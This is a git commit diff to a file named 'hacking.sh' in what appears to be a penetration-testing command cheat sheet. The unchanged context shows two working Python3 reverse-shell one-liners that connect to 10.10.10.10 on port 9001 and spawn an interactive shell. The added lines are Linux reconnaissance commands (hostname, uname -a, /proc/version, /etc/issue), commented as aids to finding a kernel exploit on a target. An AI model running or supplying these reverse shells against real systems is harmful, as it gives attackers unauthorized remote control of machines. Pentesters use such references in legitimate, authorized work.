19bec1bb03a3b7d0f35a23f880bdac0120538917
NextGenSec <142174128+NextGenSec-Github@users.noreply.github.com>
2024-04-07 00:47:15 +0500

    Update hacking.sh

--- Command Cheatsheets/hacking.sh
+++ Command Cheatsheets/hacking.sh
@@ -22,3 +22,17 @@ ip addr show eth0
 # Reverse Shell with Python3
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 export RHOST="10.10.10.10";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+
+# Returns the hostname of the machine, it can provide information about the target system's role within the network
+hostname
+
+# Provides details about the kernel, which is useful in searching for a kernel exploit
+uname -a
+
+# Provides information on the kernel version and whether a compiler is installed or not GCC for instance
+cat /proc/version
+
+# Can contain info on the OS
+cat /etc/issue
+
+
